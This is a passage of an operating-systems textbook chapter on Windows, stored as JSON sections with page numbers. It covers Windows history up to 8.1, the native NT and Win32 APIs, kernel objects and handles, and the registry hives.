when multi\u0002processor, 32-bit, multimegabyte, virtual memory systems were common. In NT,\r\nthreads are the units of concurrency, dynamic libraries are the units of composition,\r\nand fork/exec are implemented by a single operation to create a new process and\r\nrun another program without first making a copy.\r\nThe first version of NT-based Windows (Windows NT 3.1) was released in\r\n1993. It was called 3.1 to correspond with the then-current consumer Windows\r\n3.1. The joint project with IBM had foundered, so though the OS/2 interfaces were\r\nstill supported, the primary interfaces were 32-bit extensions of the Windows APIs,\r\ncalled Win32. Between the time NT was started and first shipped, Windows 3.0\r\nhad been released and had become extremely successful commercially. It too was\r\nable to run Win32 programs, but using the Win32s compatibility library.\r\nLike the first version of MS-DOS-based Windows, NT-based Windows was\r\nnot initially successful. NT required more memory, there were few 32-bit applica\u0002tions available, and incompatibilities with device drivers and applications caused\r\nmany customers to stick with MS-DOS-based Windows which Microsoft was still\r\nimproving, releasing Windows 95 in 1995. Windows 95 provided native 32-bit\r\nprogramming interfaces like NT, but better compatibility with existing 16-bit soft\u0002ware and applications. Not surprisingly, NT’s early success was in the server mar\u0002ket, competing with VMS and NetWare.\nSEC. 11.1 HISTORY OF WINDOWS THROUGH WINDOWS 8.1 861\r\nNT did meet its portability goals, with additional releases in 1994 and 1995\r\nadding support for (little-endian) MIPS and PowerPC architectures. The first\r\nmajor upgrade to NT came with Windows NT 4.0 in 1996. This system had the\r\npower, security, and reliability of NT, but also sported the same user interface as\r\nthe by-then very popular Windows 95.\r\nFigure 11-3 shows the relationship of the Win32 API to Windows. Having a\r\ncommon API across both the MS-DOS-based and NT-based Windows was impor\u0002tant to the success of NT.\r\nThis compatibility made it much easier for users to migrate from Windows 95\r\nto NT, and the operating system became a strong player in the high-end desktop\r\nmarket as well as servers. However, customers were not as willing to adopt other\r\nprocessor architectures, and of the four architectures Windows NT 4.0 supported in\r\n1996 (the DEC Alpha was added in that release), only the x86 (i.e., Pentium fam\u0002ily) was still actively supported by the time of the next major release, Windows\r\n2000.\r\nWin32 application program\r\nWin32 application programming interface\r\nWindows\r\n3.0/3.1\r\nWindows\r\n95/98/98SE/Me\r\nWindows\r\nNT/2000/Vista/7\r\nWindows\r\n8/8.1\r\nWin32s\r\nFigure 11-3. The Win32 API allows programs to run on almost all versions of\r\nWindows.\r\nWindows 2000 represented a significant evolution for NT. The key technolo\u0002gies added were plug-and-play (for consumers who installed a new PCI card, elim\u0002inating the need to fiddle with jumpers), network directory services (for enterprise\r\ncustomers), improved power management (for notebook computers), and an im\u0002proved GUI (for everyone).\r\nThe technical success of Windows 2000 led Microsoft to push toward the dep\u0002recation of Windows 98 by enhancing the application and device compatibility of\r\nthe next NT release, Windows XP. Windows XP included a friendlier new look\u0002and-feel to the graphical interface, bolstering Microsoft’s strategy of hooking con\u0002sumers and reaping the benefit as they pressured their employers to adopt systems\r\nwith which they were already familiar. The strategy was overwhelmingly suc\u0002cessful, with Windows XP being installed on hundreds of millions of PCs over its\r\nfirst few years, allowing Microsoft to achieve its goal of effectively ending the era\r\nof MS-DOS-based Windows.\n862 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nMicrosoft followed up Windows XP by embarking on an ambitious release to\r\nkindle renewed excitement among PC consumers. The result, Windows Vista,\r\nwas completed in late 2006, more than fiv e years after Windows XP shipped. Win\u0002dows Vista boasted yet another redesign of the graphical interface, and new securi\u0002ty features under the covers. Most of the changes were in customer-visible experi\u0002ences and capabilities. The technologies under the covers of the system improved\r\nincrementally, with much clean-up of the code and many improvements in per\u0002formance, scalability, and reliability. The server version of Vista (Windows Server\r\n2008) was delivered about a year after the consumer version. It shares, with Vista,\r\nthe same core system components, such as the kernel, drivers, and low-level librar\u0002ies and programs.\r\nThe human story of the early development of NT is related in the book Show\u0002stopper (Zachary, 1994). The book tells a lot about the key people involved and\r\nthe difficulties of undertaking such an ambitious software development project."
          },
          "11.1.4 Windows Vista": {
            "page": 893,
            "content": "11.1.4 Windows Vista\r\nThe release of Windows Vista culminated Microsoft’s most extensive operating\r\nsystem project to date. The initial plans were so ambitious that a couple of years\r\ninto its development Vista had to be restarted with a smaller scope. Plans to rely\r\nheavily on Microsoft’s type-safe, garbage-collected .NET language C# were\r\nshelved, as were some significant features such as the WinFS unified storage sys\u0002tem for searching and organizing data from many different sources. The size of the\r\nfull operating system is staggering. The original NT release of 3 million lines of\r\nC/C++ that had grown to 16 million in NT 4, 30 million in 2000, and 50 million in\r\nXP. It is over 70 million lines in Vista and more in Windows 7 and 8.\r\nMuch of the size is due to Microsoft’s emphasis on adding many new features\r\nto its products in every release. In the main system32 directory, there are 1600\r\nDLLs (Dynamic Link Libraries) and 400 EXEs (Executables), and that does not\r\ninclude the other directories containing the myriad of applets included with the op\u0002erating system that allow users to surf the Web, play music and video, send email,\r\nscan documents, organize photos, and even make movies. Because Microsoft\r\nwants customers to switch to new versions, it maintains compatibility by generally\r\nkeeping all the features, APIs, applets (small applications), etc., from the previous\r\nversion. Few things ever get deleted. The result is that Windows was growing dra\u0002matically release to release. Windows’ distribution media had moved from floppy,\r\nto CD, and with Windows Vista, to DVD. Technology had been keeping up, how\u0002ev er, and faster processors and larger memories made it possible for computers to\r\nget faster despite all this bloat.\r\nUnfortunately for Microsoft, Windows Vista was released at a time when cus\u0002tomers were becoming enthralled with inexpensive computers, such as low-end\r\nnotebooks and netbook computers. These machines used slower processors to\r\nsave cost and battery life, and in their earlier generations limited memory sizes. At\nSEC. 11.1 HISTORY OF WINDOWS THROUGH WINDOWS 8.1 863\r\nthe same time, processor performance ceased to improve at the same rate it had\r\npreviously, due to the difficulties in dissipating the heat created by ever-increasing\r\nclock speeds. Moore’s Law continued to hold, but the additional transistors were\r\ngoing into new features and multiple processors rather than improvements in sin\u0002gle-processor performance. All the bloat in Windows Vista meant that it per\u0002formed poorly on these computers relative to Windows XP, and the release was\r\nnever widely accepted.\r\nThe issues with Windows Vista were addressed in the subsequent release,\r\nWindows 7. Microsoft invested heavily in testing and performance automation,\r\nnew telemetry technology, and extensively strengthened the teams charged with\r\nimproving performance, reliability, and security. Though Windows 7 had rela\u0002tively few functional changes compared to Windows Vista, it was better engineered\r\nand more efficient. Windows 7 quickly supplanted Vista and ultimately Windows\r\nXP to be the most popular version of Windows to date."
          },
          "11.1.5 2010s: Modern Windows": {
            "page": 894,
            "content": "11.1.5 2010s: Modern Windows\r\nBy the time Windows 7 shipped, the computing industry once again began to\r\nchange dramatically. The success of the Apple iPhone as a portable computing de\u0002vice, and the advent of the Apple iPad, had heralded a sea-change which led to the\r\ndominance of lower-cost Android tablets and phones, much as Microsoft had dom\u0002inated the desktop in the first three decades of personal computing. Small,\r\nportable, yet powerful devices and ubiquitous fast networks were creating a world\r\nwhere mobile computing and network-based services were becoming the dominant\r\nparadigm. The old world of portable computers was replaced by machines with\r\nsmall screens that ran applications readily downloadable from the Web. These ap\u0002plications were not the traditional variety, like word processing, spreadsheets, and\r\nconnecting to corporate servers. Instead, they provided access to services like Web\r\nsearch, social networking, Wikipedia, streaming music and video, shopping, and\r\npersonal navigation. The business models for computing were also changing, with\r\nadvertising opportunities becoming the largest economic force behind computing.\r\nMicrosoft began a process to redesign itself as a devices and services company\r\nin order to better compete with Google and Apple. It needed an operating system\r\nit could deploy across a wide spectrum of devices: phones, tablets, game consoles,\r\nlaptops, desktops, servers, and the cloud. Windows thus underwent an even bigger\r\nev olution than with Windows Vista, resulting in Windows 8. Howev er, this time\r\nMicrosoft applied the lessons from Windows 7 to create a well-engineered, per\u0002formant product with less bloat.\r\nWindows 8 built on the modular MinWin approach Microsoft used in Win\u0002dows 7 to produce a small operating system core that could be extended onto dif\u0002ferent devices. The goal was for each of the operating systems for specific devices\r\nto be built by extending this core with new user interfaces and features, yet provide\r\nas common an experience for users as possible. This approach was successfully\n864 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\napplied to Windows Phone 8, which shares most of the core binaries with desktop\r\nand server Windows. Support of phones and tablets by Windows required support\r\nfor the popular ARM architecture, as well as new Intel processors targeting those\r\ndevices. What makes Windows 8 part of the Modern Windows era are the funda\u0002mental changes in the programming models, as we will examine in the next sec\u0002tion.\r\nWindows 8 was not received to universal acclaim. In particular, the lack of the\r\nStart Button on the taskbar (and its associated menu) was viewed by many users as\r\na huge mistake. Others objected to using a tablet-like interface on a desktop ma\u0002chine with a large monitor. Microsoft responded to this and other criticisms on\r\nMay 14, 2013 by releasing an update called Windows 8.1. This version fixed\r\nthese problems while at the same time introducing a host of new features, such as\r\nbetter cloud integration, as well as a number of new programs. Although we will\r\nstick to the more generic name of ‘‘Windows 8’’ in this chapter, in fact, everything\r\nin it is a description of how Windows 8.1 works."
          }
        }
      },
      "11.2 PROGRAMMING WINDOWS": {
        "page": 895,
        "children": {
          "11.2.1 The Native NT Application Programming Interface": {
            "page": 899,
            "content": "11.2.1 The Native NT Application Programming Interface\r\nLike all other operating systems, Windows has a set of system calls it can per\u0002form. In Windows, these are implemented in the NTOS executive layer that runs\r\nin kernel mode. Microsoft has published very few of the details of these native\r\nsystem calls. They are used internally by lower-level programs that ship as part of\r\nthe operating system (mainly services and the subsystems), as well as kernel-mode\r\ndevice drivers. The native NT system calls do not really change very much from\r\nrelease to release, but Microsoft chose not to make them public so that applications\r\nwritten for Windows would be based on Win32 and thus more likely to work with\r\nboth the MS-DOS-based and NT-based Windows systems, since the Win32 API is\r\ncommon to both.\r\nMost of the native NT system calls operate on kernel-mode objects of one kind\r\nor another, including files, processes, threads, pipes, semaphores, and so on. Fig\u0002ure 11-6 gives a list of some of the common categories of kernel-mode objects sup\u0002ported by the kernel in Windows. Later, when we discuss the object manager, we\r\nwill provide further details on the specific object types.\r\nObject category Examples\r\nSynchronization Semaphores, mutexes, events, IPC ports, I/O completion queues\r\nI/O Files, devices, drivers, timers\r\nProgram Jobs, processes, threads, sections, tokens\r\nWin32 GUI Desktops, application callbacks\r\nFigure 11-6. Common categories of kernel-mode object types.\r\nSometimes use of the term object regarding the data structures manipulated by\r\nthe operating system can be confusing because it is mistaken for object-oriented.\r\nOperating system objects do provide data hiding and abstraction, but they lack\r\nsome of the most basic properties of object-oriented systems such as inheritance\r\nand polymorphism.\r\nIn the native NT API, calls are available to create new kernel-mode objects or\r\naccess existing ones. Every call creating or opening an object returns a result called\r\na handle to the caller. The handle can subsequently be used to perform operations\r\non the object. Handles are specific to the process that created them. In general\r\nhandles cannot be passed directly to another process and used to refer to the same\r\nobject. However, under certain circumstances, it is possible to duplicate a handle\r\ninto the handle table of other processes in a protected way, allowing processes to\r\nshare access to objects—even if the objects are not accessible in the namespace.\r\nThe process duplicating each handle must itself have handles for both the source\r\nand target process.\r\nEvery object has a security descriptor associated with it, telling in detail who\r\nmay and may not perform what kinds of operations on the object based on the\nSEC. 11.2 PROGRAMMING WINDOWS 869\r\naccess requested. When handles are duplicated between processes, new access\r\nrestrictions can be added that are specific to the duplicated handle. Thus, a process\r\ncan duplicate a read-write handle and turn it into a read-only version in the target\r\nprocess.\r\nNot all system-created data structures are objects and not all objects are kernel\u0002mode objects. The only ones that are true kernel-mode objects are those that need\r\nto be named, protected, or shared in some way. Usually, they represent some kind\r\nof programming abstraction implemented in the kernel. Every kernel-mode object\r\nhas a system-defined type, has well-defined operations on it, and occupies storage\r\nin kernel memory. Although user-mode programs can perform the operations (by\r\nmaking system calls), they cannot get at the data directly.\r\nFigure 11-7 shows a sampling of the native APIs, all of which use explicit\r\nhandles to manipulate kernel-mode objects such as processes, threads, IPC ports,\r\nand sections (which are used to describe memory objects that can be mapped into\r\naddress spaces). NtCreateProcess returns a handle to a newly created process ob\u0002ject, representing an executing instance of the program represented by the Section\u0002Handle. DebugPor tHandle is used to communicate with a debugger when giving it\r\ncontrol of the process after an exception (e.g., dividing by zero or accessing invalid\r\nmemory). ExceptPor tHandle is used to communicate with a subsystem process\r\nwhen errors occur and are not handled by an attached debugger.\r\nNtCreateProcess(&ProcHandle, Access, SectionHandle, DebugPor tHandle, ExceptPor tHandle, ...)\r\nNtCreateThread(&ThreadHandle, ProcHandle, Access, ThreadContext, CreateSuspended, ...)\r\nNtAllocateVir tualMemory(ProcHandle, Addr, Size, Type, Protection, ...)\r\nNtMapViewOfSection(SectHandle, ProcHandle, Addr, Size, Protection, ...)\r\nNtReadVir tualMemory(ProcHandle, Addr, Size, ...)\r\nNtWr iteVirtualMemor y(ProcHandle, Addr, Size, ...)\r\nNtCreateFile(&FileHandle, FileNameDescr iptor, Access, ...)\r\nNtDuplicateObject(srcProcHandle, srcObjHandle, dstProcHandle, dstObjHandle, ...)\r\nFigure 11-7. Examples of native NT API calls that use handles to manipulate ob\u0002jects across process boundaries.\r\nNtCreateThread takes ProcHandle because it can create a thread in any process\r\nfor which the calling process has a handle (with sufficient access rights). Simi\u0002larly, NtAllocateVir tualMemory, NtMapViewOfSection, NtReadVir tualMemory, and\r\nNtWr iteVirtualMemor y allow one process not only to operate on its own address\r\nspace, but also to allocate virtual addresses, map sections, and read or write virtual\r\nmemory in other processes. NtCreateFile is the native API call for creating a new\r\nfile or opening an existing one. NtDuplicateObject is the API call for duplicating\r\nhandles from one process to another.\r\nKernel-mode objects are, of course, not unique to Windows. UNIX systems\r\nalso support a variety of kernel-mode objects, such as files, network sockets, pipes,\n870 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\ndevices, processes, and interprocess communication (IPC) facilities like shared\r\nmemory, message ports, semaphores, and I/O devices. In UNIX there are a variety\r\nof ways of naming and accessing objects, such as file descriptors, process IDs, and\r\ninteger IDs for SystemV IPC objects, and i-nodes for devices. The implementation\r\nof each class of UNIX objects is specific to the class. Files and sockets use dif\u0002ferent facilities than the SystemV IPC mechanisms or processes or devices.\r\nKernel objects in Windows use a uniform facility based on handles and names\r\nin the NT namespace to reference kernel objects, along with a unified imple\u0002mentation in a centralized object manager. Handles are per-process but, as de\u0002scribed above, can be duplicated into another process. The object manager allows\r\nobjects to be given names when they are created, and then opened by name to get\r\nhandles for the objects.\r\nThe object manager uses Unicode (wide characters) to represent names in the\r\nNT namespace. Unlike UNIX, NT does not generally distinguish between upper\u0002and lowercase (it is case preserving but case insensitive). The NT namespace is a\r\nhierarchical tree-structured collection of directories, symbolic links and objects.\r\nThe object manager also provides unified facilities for synchronization, securi\u0002ty, and object lifetime management. Whether the general facilities provided by the\r\nobject manager are made available to users of any particular object is up to the ex\u0002ecutive components, as they provide the native APIs that manipulate each object\r\ntype.\r\nIt is not only applications that use objects managed by the object manager.\r\nThe operating system itself can also create and use objects—and does so heavily.\r\nMost of these objects are created to allow one component of the system to store\r\nsome information for a substantial period of time or to pass some data structure to\r\nanother component, and yet benefit from the naming and lifetime support of the\r\nobject manager. For example, when a device is discovered, one or more device\r\nobjects are created to represent the device and to logically describe how the device\r\nis connected to the rest of the system. To control the device a device driver is load\u0002ed, and a driver object is created holding its properties and providing pointers to\r\nthe functions it implements for processing the I/O requests. Within the operating\r\nsystem the driver is then referred to by using its object. The driver can also be ac\u0002cessed directly by name rather than indirectly through the devices it controls (e.g.,\r\nto set parameters governing its operation from user mode).\r\nUnlike UNIX, which places the root of its namespace in the file system, the\r\nroot of the NT namespace is maintained in the kernel’s virtual memory. This\r\nmeans that NT must recreate its top-level namespace every time the system boots.\r\nUsing kernel virtual memory allows NT to store information in the namespace\r\nwithout first having to start the file system running. It also makes it much easier\r\nfor NT to add new types of kernel-mode objects to the system because the formats\r\nof the file systems themselves do not have to be modified for each new object type.\r\nA named object can be marked permanent, meaning that it continues to exist\r\nuntil explicitly deleted or the system reboots, even if no process currently has a\nSEC. 11.2 PROGRAMMING WINDOWS 871\r\nhandle for the object. Such objects can even extend the NT namespace by provid\u0002ing parse routines that allow the objects to function somewhat like mount points in\r\nUNIX. File systems and the registry use this facility to mount volumes and hives\r\nonto the NT namespace. Accessing the device object for a volume gives access to\r\nthe raw volume, but the device object also represents an implicit mount of the vol\u0002ume into the NT namespace. The individual files on a volume can be accessed by\r\nconcatenating the volume-relative file name onto the end of the name of the device\r\nobject for that volume.\r\nPermanent names are also used to represent synchronization objects and shared\r\nmemory, so that they can be shared by processes without being continually recreat\u0002ed as processes stop and start. Device objects and often driver objects are given\r\npermanent names, giving them some of the persistence properties of the special i\u0002nodes kept in the /dev directory of UNIX.\r\nWe will describe many more of the features in the native NT API in the next\r\nsection, where we discuss the Win32 APIs that provide wrappers around the NT\r\nsystem calls."
          },
          "11.2.2 The Win32 Application Programming Interface": {
            "page": 902,
            "content": "11.2.2 The Win32 Application Programming Interface\r\nThe Win32 function calls are collectively called the Win32 API. These inter\u0002faces are publicly disclosed and fully documented. They are implemented as li\u0002brary procedures that either wrap the native NT system calls used to get the work\r\ndone or, in some cases, do the work right in user mode. Though the native NT\r\nAPIs are not published, most of the functionality they provide is accessible through\r\nthe Win32 API. The existing Win32 API calls rarely change with new releases of\r\nWindows, though many new functions are added to the API.\r\nFigure 11-8 shows various low-level Win32 API calls and the native NT API\r\ncalls that they wrap. What is interesting about the figure is how uninteresting the\r\nmapping is. Most low-level Win32 functions have native NT equivalents, which is\r\nnot surprising as Win32 was designed with NT in mind. In many cases the Win32\r\nlayer must manipulate the Win32 parameters to map them onto NT, for example,\r\ncanonicalizing path names and mapping onto the appropriate NT path names, in\u0002cluding special MS-DOS device names (like LPT:). The Win32 APIs for creating\r\nprocesses and threads also must notify the Win32 subsystem process, csrss.exe,\r\nthat there are new processes and threads for it to supervise, as we will describe in\r\nSec. 11.4.\r\nSome Win32 calls take path names, whereas the equivalent NT calls use hand\u0002les. So the wrapper routines have to open the files, call NT, and then close the\r\nhandle at the end. The wrappers also translate the Win32 APIs from ANSI to Uni\u0002code. The Win32 functions shown in Fig. 11-8 that use strings as parameters are\r\nactually two APIs, for example, CreateProcessW and CreateProcessA. The\r\nstrings passed to the latter API must be translated to Unicode before calling the un\u0002derlying NT API, since NT works only with Unicode.\n872 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nWin32 call Native NT API call\r\nCreateProcess NtCreateProcess\r\nCreateThread NtCreateThread\r\nSuspendThread NtSuspendThread\r\nCreateSemaphore NtCreateSemaphore\r\nReadFile NtReadFile\r\nDeleteFile NtSetInfor mationFile\r\nCreateFileMapping NtCreateSection\r\nVir tualAlloc NtAllocateVir tualMemory\r\nMapViewOfFile NtMapViewOfSection\r\nDuplicateHandle NtDuplicateObject\r\nCloseHandle NtClose\r\nFigure 11-8. Examples of Win32 API calls and the native NT API calls that they\r\nwrap.\r\nSince few changes are made to the existing Win32 interfaces in each release of\r\nWindows, in theory the binary programs that ran correctly on any previous release\r\nwill continue to run correctly on a new release. In practice, there are often many\r\ncompatibility problems with new releases. Windows is so complex that a few\r\nseemingly inconsequential changes can cause application failures. And applica\u0002tions themselves are often to blame, since they frequently make explicit checks for\r\nspecific operating system versions or fall victim to their own latent bugs that are\r\nexposed when they run on a new release. Nevertheless, Microsoft makes an effort\r\nin every release to test a wide variety of applications to find incompatibilities and\r\neither correct them or provide application-specific workarounds.\r\nWindows supports two special execution environments both called WOW\r\n(Windows-on-Windows). WOW32 is used on 32-bit x86 systems to run 16-bit\r\nWindows 3.x applications by mapping the system calls and parameters between the\r\n16-bit and 32-bit worlds. Similarly, WOW64 allows 32-bit Windows applications\r\nto run on x64 systems.\r\nThe Windows API philosophy is very different from the UNIX philosophy. In\r\nthe latter, the operating system functions are simple, with few parameters and few\r\nplaces where there are multiple ways to perform the same operation. Win32 pro\u0002vides very comprehensive interfaces with many parameters, often with three or\r\nfour ways of doing the same thing, and mixing together low-level and high-level\r\nfunctions, like CreateFile and CopyFile.\r\nThis means Win32 provides a very rich set of interfaces, but it also introduces\r\nmuch complexity due to the poor layering of a system that intermixes both high\u0002level and low-level functions in the same API. For our study of operating systems,\r\nonly the low-level functions of the Win32 API that wrap the native NT API are rel\u0002evant, so those are what we will focus on.\nSEC. 11.2 PROGRAMMING WINDOWS 873\r\nWin32 has calls for creating and managing both processes and threads. There\r\nare also many calls that relate to interprocess communication, such as creating, de\u0002stroying, and using mutexes, semaphores, events, communication ports, and other\r\nIPC objects.\r\nAlthough much of the memory-management system is invisible to pro\u0002grammers, one important feature is visible: namely the ability of a process to map\r\na file onto a region of its virtual memory. This allows threads running in a process\r\nthe ability to read and write parts of the file using pointers without having to expli\u0002citly perform read and write operations to transfer data between the disk and mem\u0002ory. With memory-mapped files the memory-management system itself performs\r\nthe I/Os as needed (demand paging).\r\nWindows implements memory-mapped files using three completely different\r\nfacilities. First it provides interfaces which allow processes to manage their own\r\nvirtual address space, including reserving ranges of addresses for later use. Sec\u0002ond, Win32 supports an abstraction called a file mapping, which is used to repres\u0002ent addressable objects like files (a file mapping is called a section in the NT\r\nlayer). Most often, file mappings are created to refer to files using a file handle,\r\nbut they can also be created to refer to private pages allocated from the system\r\npagefile.\r\nThe third facility maps views of file mappings into a process’ address space.\r\nWin32 allows only a view to be created for the current process, but the underlying\r\nNT facility is more general, allowing views to be created for any process for which\r\nyou have a handle with the appropriate permissions. Separating the creation of a\r\nfile mapping from the operation of mapping the file into the address space is a dif\u0002ferent approach than used in the mmap function in UNIX.\r\nIn Windows, the file mappings are kernel-mode objects represented by a hand\u0002le. Like most handles, file mappings can be duplicated into other processes. Each\r\nof these processes can map the file mapping into its own address space as it sees\r\nfit. This is useful for sharing private memory between processes without having to\r\ncreate files for sharing. At the NT layer, file mappings (sections) can also be made\r\npersistent in the NT namespace and accessed by name.\r\nAn important area for many programs is file I/O. In the basic Win32 view, a\r\nfile is just a linear sequence of bytes. Win32 provides over 60 calls for creating\r\nand destroying files and directories, opening and closing files, reading and writing\r\nthem, requesting and setting file attributes, locking ranges of bytes, and many more\r\nfundamental operations on both the organization of the file system and access to\r\nindividual files.\r\nThere are also various advanced facilities for managing data in files. In addi\u0002tion to the primary data stream, files stored on the NTFS file system can have addi\u0002tional data streams. Files (and even entire volumes) can be encrypted. Files can be\r\ncompressed, and/or represented as a sparse stream of bytes where missing regions\r\nof data in the middle occupy no storage on disk. File-system volumes can be\r\norganized out of multiple separate disk partitions using different levels of RAID\n874 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nstorage. Modifications to files or directory subtrees can be detected through a noti\u0002fication mechanism, or by reading the journal that NTFS maintains for each vol\u0002ume.\r\nEach file-system volume is implicitly mounted in the NT namespace, accord\u0002ing to the name given to the volume, so a file \\ foo \\ bar might be named, for ex\u0002ample, \\ Device \\ HarddiskVolume \\ foo \\ bar. Internal to each NTFS volume, mount\r\npoints (called reparse points in Windows) and symbolic links are supported to help\r\norganize the individual volumes.\r\nThe low-level I/O model in Windows is fundamentally asynchronous. Once an\r\nI/O operation is begun, the system call can return and allow the thread which initi\u0002ated the I/O to continue in parallel with the I/O operation. Windows supports can\u0002cellation, as well as a number of different mechanisms for threads to synchronize\r\nwith I/O operations when they complete. Windows also allows programs to speci\u0002fy that I/O should be synchronous when a file is opened, and many library func\u0002tions, such as the C library and many Win32 calls, specify synchronous I/O for\r\ncompatibility or to simplify the programming model. In these cases the executive\r\nwill explicitly synchronize with I/O completion before returning to user mode.\r\nAnother area for which Win32 provides calls is security. Every thread is asso\u0002ciated with a kernel-mode object, called a token, which provides information about\r\nthe identity and privileges associated with the thread. Every object can have an\r\nACL (Access Control List) telling in great detail precisely which users may ac\u0002cess it and which operations they may perform on it. This approach provides for\r\nfine-grained security in which specific users can be allowed or denied specific ac\u0002cess to every object. The security model is extensible, allowing applications to add\r\nnew security rules, such as limiting the hours access is permitted.\r\nThe Win32 namespace is different than the native NT namespace described in\r\nthe previous section. Only parts of the NT namespace are visible to Win32 APIs\r\n(though the entire NT namespace can be accessed through a Win32 hack that uses\r\nspecial prefix strings, like ‘‘ \\ \\ .’ ’). In Win32, files are accessed relative to drive let\u0002ters. The NT directory \\ DosDevices contains a set of symbolic links from drive\r\nletters to the actual device objects. For example, \\ DosDevices \\ C: might be a link\r\nto \\ Device \\ HarddiskVolume1. This directory also contains links for other Win32\r\ndevices, such as COM1:, LPT:, and NUL: (for the serial and printer ports and the\r\nall-important null device). \\ DosDevices is really a symbolic link to \\ ?? which\r\nwas chosen for efficiency. Another NT directory, \\ BaseNamedObjects, is used to\r\nstore miscellaneous named kernel-mode objects accessible through the Win32 API.\r\nThese include synchronization objects like semaphores, shared memory, timers,\r\ncommunication ports, and device names.\r\nIn addition to low-level system interfaces we have described, the Win32 API\r\nalso supports many functions for GUI operations, including all the calls for manag\u0002ing the graphical interface of the system. There are calls for creating, destroying,\r\nmanaging, and using windows, menus, tool bars, status bars, scroll bars, dialog\r\nboxes, icons, and many more items that appear on the screen. There are calls for\nSEC. 11.2 PROGRAMMING WINDOWS 875\r\ndrawing geometric figures, filling them in, managing the color palettes they use,\r\ndealing with fonts, and placing icons on the screen. Finally, there are calls for\r\ndealing with the keyboard, mouse and other human-input devices as well as audio,\r\nprinting, and other output devices.\r\nThe GUI operations work directly with the win32k.sys driver using special in\u0002terfaces to access these functions in kernel mode from user-mode libraries. Since\r\nthese calls do not involve the core system calls in the NTOS executive, we will not\r\nsay more about them."
          },
          "11.2.3 The Windows Registry": {
            "page": 906,
            "content": "11.2.3 The Windows Registry\r\nThe root of the NT namespace is maintained in the kernel. Storage, such as\r\nfile-system volumes, is attached to the NT namespace. Since the NT namespace is\r\nconstructed afresh every time the system boots, how does the system know about\r\nany specific details of the system configuration? The answer is that Windows\r\nattaches a special kind of file system (optimized for small files) to the NT name\u0002space. This file system is called the registry. The registry is organized into sepa\u0002rate volumes called hives. Each hive is kept in a separate file (in the directory\r\nC: \\ Windows \\ system32 \\ config \\ of the boot volume). When a Windows system\r\nboots, one particular hive named SYSTEM is loaded into memory by the same boot\r\nprogram that loads the kernel and other boot files, such as boot drivers, from the\r\nboot volume.\r\nWindows keeps a great deal of crucial information in the SYSTEM hive, in\u0002cluding information about what drivers to use with what devices, what software to\r\nrun initially, and many parameters governing the operation of the system. This\r\ninformation is used even by the boot program itself to determine which drivers are\r\nboot drivers, being needed immediately upon boot. Such drivers include those that\r\nunderstand the file system and disk drivers for the volume containing the operating\r\nsystem itself.\r\nOther configuration hives are used after the system boots to describe infor\u0002mation about the software installed on the system, particular users, and the classes\r\nof user-mode COM (Component Object-Model) objects that are installed on the\r\nsystem. Login information for local users is kept in the SAM (Security Access\r\nManager) hiv e. Information for network users is maintained by the lsass service\r\nin the security hive and coordinated with the network directory servers so that\r\nusers can have a common account name and password across an entire network. A\r\nlist of the hives used in Windows is shown in Fig. 11-9.\r\nPrior to the introduction of the registry, configuration information in Windows\r\nwas kept in hundreds of .ini (initialization) files spread across the disk. The reg\u0002istry gathers these files into a central store, which is available early in the process\r\nof booting the system. This is important for implementing Windows plug-and-play\r\nfunctionality. Unfortunately, the registry has become seriously disorganized over\r\ntime as Windows has evolved. There are poorly defined conventions about how the\n876 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nHive file Mounted name Use\r\nSYSTEM HKLM \\SYSTEM OS configuration infor mation, used by ker nel\r\nHARDWARE HKLM \\HARDWARE In-memory hive recording hardware detected\r\nBCD HKLM \\BCD* Boot Configuration Database\r\nSAM HKLM \\SAM Local user account infor mation\r\nSECURITY HKLM \\SECURITY lsass’ account and other security infor mation\r\nDEFAULT HKEY USERS \\.DEFAULT Default hive for new users\r\nNTUSER.DAT HKEY USERS \\<user id> User-specific hive, kept in home directory\r\nSOFTWARE HKLM \\SOFTWARE Application classes registered by COM\r\nCOMPONENTS HKLM \\COMPONENTS Manifests and dependencies for sys. components\r\nFigure 11-9. The registry hives in Windows. HKLM is a shorthand for\r\nHKEY LOCAL MACHINE.\r\nconfiguration information should be arranged, and many applications take an ad\r\nhoc approach. Most users, applications, and all drivers run with full privileges and\r\nfrequently modify system parameters in the registry directly—sometimes interfer\u0002ing with each other and destabilizing the system.\r\nThe registry is a strange cross between a file system and a database, and yet\r\nreally unlike either. Entire books have been written describing the registry (Born,\r\n1998; Hipson, 2002; and Ivens, 1998), and many companies have sprung up to sell\r\nspecial software just to manage the complexity of the registry.\r\nTo explore the registry Windows has a GUI program called regedit that allows\r\nyou to open and explore the directories (called keys) and data items (called values).\r\nMicrosoft’s Po werShell scripting language can also be useful for walking through\r\nthe keys and values of the registry as if they were directories and files. A more in\u0002teresting tool to use is procmon, which is available from Microsoft’s tools’ Web\u0002site: www.microsoft.com/technet/sysinternals.\r\nProcmon watches all the registry accesses that take place in the system and is\r\nvery illuminating. Some programs will access the same key over and over tens of\r\nthousands of times.\r\nAs the name implies, regedit allows users to edit the registry—but be very\r\ncareful if you ever do. It is very easy to render your system unable to boot, or\r\ndamage the installation of applications so that you cannot fix them without a lot of\r\nwizardry. Microsoft has promised to clean up the registry in future releases, but\r\nfor now it is a huge mess—far more complicated than the configuration infor\u0002mation maintained in UNIX. The complexity and fragility of the registry led de\u0002signers of new operating systems—in particular—iOS and Android—to avoid any\u0002thing like it.\r\nThe registry is accessible to the Win32 programmer. There are calls to create\r\nand delete keys, look up values within keys, and more. Some of the more useful\r\nones are listed in Fig. 11-10.\nSEC. 11.2 PROGRAMMING WINDOWS 877\r\nWin32 API function Description\r\nRegCreateKeyEx Create a new registr y key\r\nRegDeleteKey Delete a registry key\r\nRegOpenKeyEx Open a key to get a handle to it\r\nRegEnumKeyEx Enumerate the subkeys subordinate to the key of the handle\r\nRegQuer yValueEx Look up the data for a value within a key\r\nFigure 11-10. Some of the Win32 API calls for using the registry\r\nWhen the system is turned off, most of the registry information is stored on the\r\ndisk in the hives. Because their integrity is so critical to correct system func\u0002tioning, backups are made automatically and metadata writes are flushed to disk to\r\nprevent corruption in the event of a system crash. Loss of the registry requires\r\nreinstalling all software on the system."
          }
        }
      },
      "11.3 SYSTEM STRUCTURE": {
        "page": 908,
        "children": {
          "11.3.1 Operating System Structure": {
            "page": 908,
